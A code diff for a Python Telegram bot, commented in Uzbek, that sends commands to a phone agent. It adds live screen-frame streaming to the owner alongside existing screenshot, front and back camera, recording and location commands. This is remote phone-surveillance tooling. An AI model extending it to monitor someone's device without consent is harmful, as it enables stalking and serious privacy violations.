@@ -1,6 +1,7 @@
 """Hullas bot — telefon agent buyruqlari (HTTP polling orqali).
 
-Buyruqlar: /screenshot, /cam_back, /cam_front, /record, /location, /device
+Buyruqlar: /screenshot, /cam_back, /cam_front, /record, /location, /device,
+           /live_start, /live_stop
 """
 from __future__ import annotations
 
@@ -25,6 +26,7 @@ _DB_PATH = Path(os.environ.get("DEVICE_DB_PATH", "/opt/hullas/device.db"))
 _TIMEOUT = int(os.environ.get("DEVICE_TIMEOUT", "90"))
 
 _store = DeviceStore(_DB_PATH)
+_live_delivery_task: asyncio.Task | None = None
 
 
 def register_app_handlers(
@@ -64,6 +66,55 @@ def register_app_handlers(
     async def cmd_location(event):
         await _run_device_cmd(event, "location", {})
 
+    @bot.on(events.NewMessage(pattern="/live_start$", func=_is_owner))
+    async def cmd_live_start(event):
+        session = _store.get_live_session()
+        if session and session.get("active"):
+            await event.respond(
+                "⚠️ Live allaqachon ishlayapti.\n/live_stop bilan to'xtating.",
+            )
+            return
+        cmd_id = _store.create_command("live_start", {})
+        _store.start_live_session(cmd_id)
+        _ensure_live_delivery(bot, owner_id)
+        await event.respond(
+            "🔴 <b>Live boshlandi</b>\n"
+            "Ekran kadrlari har 2–3 sek yuboriladi.\n"
+            "/live_stop — to'xtatish",
+            parse_mode="html",
+        )
+
+    @bot.on(events.NewMessage(pattern="/live_stop$", func=_is_owner))
+    async def cmd_live_stop(event):
+        session = _store.get_live_session()
+        if not session or not session.get("active"):
+            await event.respond("⚠️ Live ishlamayapti.")
+            return
+        cmd_id = _store.create_command("live_stop", {})
+        await event.respond("⏳ Live to'xtatilmoqda...")
+        for _ in range(_TIMEOUT):
+            row = _store.get_command(cmd_id)
+            if row and row["status"] in ("done", "failed"):
+                if row["status"] == "failed":
+                    err = html.escape(
+                        (row.get("result") or {}).get("error") or "xato",
+                    )
+                    await event.respond(f"❌ Live to'xtatilmadi: {err}")
+                else:
+                    live_row = _store.get_command(session["command_id"])
+                    frames = 0
+                    if live_row and live_row.get("result"):
+                        frames = live_row["result"].get("frames", 0)
+                    await event.respond(
+                        f"⏹ <b>Live to'xtatildi</b>\n"
+                        f"Jami kadrlar: {frames}",
+                        parse_mode="html",
+                    )
+                return
+            await asyncio.sleep(1)
+        _store.complete_command(cmd_id, "timeout", {"error": "timeout"})
+        await event.respond("⏱ Live to'xtatish — javob kelmadi.")
+
     @bot.on(events.NewMessage(pattern="/device$", func=_is_owner))
     async def cmd_device(event):
         info = _store.last_seen()
@@ -80,13 +131,56 @@ def register_app_handlers(
             local = info["last_seen"]
             status = "?"
         device = html.escape(info.get("device_info") or "Noma'lum")
+        live = _store.get_live_session()
+        live_line = "\n🔴 Live: faol" if live else ""
         await event.respond(
             f"📱 <b>Telefon agent</b>\n"
             f"Holat: {status}\n"
             f"Qurilma: {device}\n"
-            f"Oxirgi: <code>{local}</code>",
+            f"Oxirgi: <code>{local}</code>{live_line}",
             parse_mode="html",
         )
+
+    def _ensure_live_delivery(bot: TelegramClient, owner_id: int) -> None:
+        global _live_delivery_task
+        if _live_delivery_task is None or _live_delivery_task.done():
+            _live_delivery_task = asyncio.create_task(
+                _live_frame_delivery_loop(bot, owner_id),
+            )
+
+    async def _live_frame_delivery_loop(
+        bot: TelegramClient,
+        owner_id: int,
+    ) -> None:
+        idle_ticks = 0
+        while True:
+            frames = _store.poll_live_frames(limit=5)
+            if frames:
+                idle_ticks = 0
+                for frame in frames:
+                    path = _UPLOAD_DIR / frame["filename"]
+                    if not path.exists():
+                        _store.mark_frame_sent(frame["id"])
+                        continue
+                    try:
+                        data = path.read_bytes()
+                        buf = io.BytesIO(data)
+                        buf.name = frame["filename"]
+                        await bot.send_file(owner_id, buf)
+                    except Exception:
+                        log.exception("Live frame yuborishda xato")
+                    finally:
+                        _store.mark_frame_sent(frame["id"])
+                        try:
+                            path.unlink()
+                        except OSError:
+                            pass
+                await asyncio.sleep(0.8)
+            else:
+                idle_ticks += 1
+                if idle_ticks % 30 == 0:
+                    _store.cleanup_live_frames(hours=1)
+                await asyncio.sleep(1)
 
     async def _run_device_cmd(event, cmd: str, args: dict) -> None:
         cmd_id = _store.create_command(cmd, args)
